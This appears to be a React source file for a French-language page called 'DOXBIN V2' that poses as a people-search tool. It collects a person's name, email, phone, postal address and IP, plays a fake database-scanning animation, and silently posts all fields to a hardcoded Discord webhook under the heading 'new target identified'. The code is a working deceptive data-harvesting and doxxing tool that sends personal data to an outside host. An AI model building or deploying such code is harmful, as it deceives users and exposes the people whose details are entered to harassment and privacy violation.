import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Search, Loader2, CheckCircle2, XCircle, Radar } from 'lucide-react';
import './App.css';

const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";

function App() {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    ip: ''
  });

  const [focusedField, setFocusedField] = useState(null);
  const [isScanning, setIsScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.firstName.trim()) newErrors.firstName = 'Prénom requis';
    if (!formData.lastName.trim()) newErrors.lastName = 'Nom requis';
    
    if (!formData.email.trim()) {
      newErrors.email = 'Email requis';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Email invalide';
    }
    
    if (!formData.phone.trim()) {
      newErrors.phone = 'Téléphone requis';
    }
    
    if (!formData.address.trim()) newErrors.address = 'Adresse requise';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const sendToDiscord = async () => {
    const embed = {
      title: "🎯 NOUVELLE CIBLE IDENTIFIÉE",
      description: "Données collectées avec succès",
      color: 0x00f0ff,
      fields: [
        {
          name: "👤 Identité",
          value: `${formData.firstName} ${formData.lastName}`,
          inline: true
        },
        {
          name: "📧 Email",
          value: formData.email,
          inline: true
        },
        {
          name: "📱 Téléphone",
          value: formData.phone,
          inline: true
        },
        {
          name: "🏠 Adresse",
          value: formData.address,
          inline: false
        },
        {
          name: "🌐 IP",
          value: formData.ip || "Non fournie",
          inline: true
        }
      ],
      footer: {
        text: "DOXBIN V2 • System Active"
      },
      timestamp: new Date().toISOString()
    };

    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          embeds: [embed]
        })
      });

      return response.ok;
    } catch (error) {
      console.error('Erreur lors de l\'envoi:', error);
      return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      setScanResult({
        type: 'error',
        message: 'ERREUR : AUCUNE CORRESPONDANCE TROUVÉE DANS LA BASE DE DONNÉES'
      });
      setTimeout(() => setScanResult(null), 4000);
      return;
    }

    setIsScanning(true);
    setScanResult(null);

    // Simulate scanning animation for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));

    const success = await sendToDiscord();
    
    setIsScanning(false);
    
    if (success) {
      setScanResult({
        type: 'success',
        message: 'CIBLE IDENTIFIÉE - DONNÉES TRANSFÉRÉES'
      });
      
      // Reset form after 3 seconds
      setTimeout(() => {
        setFormData({
          firstName: '',
          lastName: '',
          email: '',
          phone: '',
          address: '',
          ip: ''
        });
        setScanResult(null);
      }, 3000);
    } else {
      setScanResult({
        type: 'error',
        message: 'ERREUR : ÉCHEC DE LA TRANSMISSION'
      });
      setTimeout(() => setScanResult(null), 4000);
    }
  };

  return (
    <div className="min-h-screen bg-deep-black relative overflow-hidden flex items-center justify-center p-4">
      {/* Animated mesh gradient background */}
      <div className="absolute inset-0 opacity-30">
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-cyber-cyan/20 via-transparent to-cyber-violet/20 animate-pulse"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-cyber-cyan/5 rounded-full blur-3xl animate-pulse"></div>
      </div>

      {/* Grid background */}
      <div className="absolute inset-0 bg-grid-pattern opacity-10"></div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8 }}
        className="relative z-10 w-full max-w-2xl"
      >
        {/* Glass card container */}
        <div className="relative backdrop-blur-xl bg-white/5 border border-white/10 rounded-3xl p-8 md:p-12 shadow-2xl">
          {/* Neon border effect */}
          <div className="absolute inset-0 rounded-3xl bg-gradient-to-r from-cyber-cyan/50 to-cyber-violet/50 opacity-20 blur-xl"></div>
          
          <div className="relative z-10">
            {/* Header */}
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2, duration: 0.6 }}
              className="text-center mb-10"
            >
              <h1 className="text-5xl md:text-6xl font-bold mb-4 bg-gradient-to-r from-cyber-cyan to-cyber-violet bg-clip-text text-transparent">
                DOXBIN V2
              </h1>
              <p className="text-gray-400 text-lg tracking-wider">SYSTÈME DE RECHERCHE AVANCÉ</p>
            </motion.div>

            <AnimatePresence mode="wait">
              {isScanning ? (
                <motion.div
                  key="scanning"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="flex flex-col items-center justify-center py-20"
                >
                  <Radar className="w-24 h-24 text-cyber-cyan mb-6 animate-spin" />
                  <div className="text-cyber-cyan text-2xl font-bold mb-4 animate-pulse">
                    ANALYSE EN COURS...
                  </div>
                  <div className="w-full max-w-md bg-white/10 rounded-full h-2 overflow-hidden">
                    <motion.div
                      className="h-full bg-gradient-to-r from-cyber-cyan to-cyber-violet"
                      initial={{ width: "0%" }}
                      animate={{ width: "100%" }}
                      transition={{ duration: 3, ease: "linear" }}
                    />
                  </div>
                  <div className="mt-6 text-gray-400 text-sm font-mono">
                    <p className="animate-pulse">{'>'} Scanning database...</p>
                    <p className="animate-pulse delay-100">{'>'} Analyzing patterns...</p>
                    <p className="animate-pulse delay-200">{'>'} Cross-referencing data...</p>
                  </div>
                </motion.div>
              ) : scanResult ? (
                <motion.div
                  key="result"
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.8 }}
                  className={`flex flex-col items-center justify-center py-20 ${
                    scanResult.type === 'success' ? 'text-green-400' : 'text-red-400'
                  }`}
                >
                  {scanResult.type === 'success' ? (
                    <CheckCircle2 className="w-24 h-24 mb-6 glow-green" />
                  ) : (
                    <XCircle className="w-24 h-24 mb-6 glow-red" />
                  )}
                  <div className={`text-2xl font-bold text-center ${
                    scanResult.type === 'success' ? 'glow-green' : 'glow-red'
                  }`}>
                    {scanResult.message}
                  </div>
                </motion.div>
              ) : (
                <motion.form
                  key="form"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  onSubmit={handleSubmit}
                  className="space-y-6"
                >
                  {/* First Name & Last Name */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <FloatingInput
                      label="Prénom"
                      name="firstName"
                      value={formData.firstName}
                      onChange={handleChange}
                      onFocus={() => setFocusedField('firstName')}
                      onBlur={() => setFocusedField(null)}
                      isFocused={focusedField === 'firstName'}
                      error={errors.firstName}
                    />
                    <FloatingInput
                      label="Nom"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleChange}
                      onFocus={() => setFocusedField('lastName')}
                      onBlur={() => setFocusedField(null)}
                      isFocused={focusedField === 'lastName'}
                      error={errors.lastName}
                    />
                  </div>

                  {/* Email */}
                  <FloatingInput
                    label="Adresse Email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleChange}
                    onFocus={() => setFocusedField('email')}
                    onBlur={() => setFocusedField(null)}
                    isFocused={focusedField === 'email'}
                    error={errors.email}
                  />

                  {/* Phone */}
                  <FloatingInput
                    label="Numéro de Téléphone"
                    name="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={handleChange}
                    onFocus={() => setFocusedField('phone')}
                    onBlur={() => setFocusedField(null)}
                    isFocused={focusedField === 'phone'}
                    error={errors.phone}
                  />

                  {/* Address */}
                  <FloatingInput
                    label="Adresse Postale"
                    name="address"
                    value={formData.address}
                    onChange={handleChange}
                    onFocus={() => setFocusedField('address')}
                    onBlur={() => setFocusedField(null)}
                    isFocused={focusedField === 'address'}
                    error={errors.address}
                  />

                  {/* IP (optional) */}
                  <FloatingInput
                    label="Adresse IP (optionnel)"
                    name="ip"
                    value={formData.ip}
                    onChange={handleChange}
                    onFocus={() => setFocusedField('ip')}
                    onBlur={() => setFocusedField(null)}
                    isFocused={focusedField === 'ip'}
                  />

                  {/* Submit Button */}
                  <motion.button
                    type="submit"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    className="w-full mt-8 py-4 px-8 bg-gradient-to-r from-cyber-cyan to-cyber-violet text-white font-bold text-lg rounded-xl shadow-lg hover:shadow-2xl transition-all duration-300 flex items-center justify-center gap-3 group relative overflow-hidden"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-cyber-violet to-cyber-cyan opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                    <Search className="w-6 h-6 relative z-10" />
                    <span className="relative z-10">LANCER LA RECHERCHE</span>
                  </motion.button>
                </motion.form>
              )}
            </AnimatePresence>
          </div>
        </div>
      </motion.div>
    </div>
  );
}

// Floating Input Component
function FloatingInput({ label, name, type = 'text', value, onChange, onFocus, onBlur, isFocused, error }) {
  const hasValue = value.length > 0;

  return (
    <div className="relative">
      <motion.input
        type={type}
        name={name}
        value={value}
        onChange={onChange}
        onFocus={onFocus}
        onBlur={onBlur}
        className={`w-full px-4 py-3 bg-white/5 border-2 rounded-xl text-white placeholder-transparent focus:outline-none transition-all duration-300 ${
          error 
            ? 'border-red-500 glow-red' 
            : isFocused 
              ? 'border-cyber-cyan glow-cyan' 
              : 'border-white/20'
        }`}
        placeholder={label}
      />
      <motion.label
        animate={{
          top: hasValue || isFocused ? '-0.75rem' : '0.75rem',
          fontSize: hasValue || isFocused ? '0.75rem' : '1rem',
          color: error ? '#ef4444' : isFocused ? '#00f0ff' : '#9ca3af'
        }}
        className="absolute left-4 bg-deep-black px-2 pointer-events-none transition-all duration-300"
      >
        {label}
      </motion.label>
      {error && (
        <motion.p
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-red-500 text-sm mt-1 ml-1"
        >
          {error}
        </motion.p>
      )}
    </div>
  );
}

export default App;
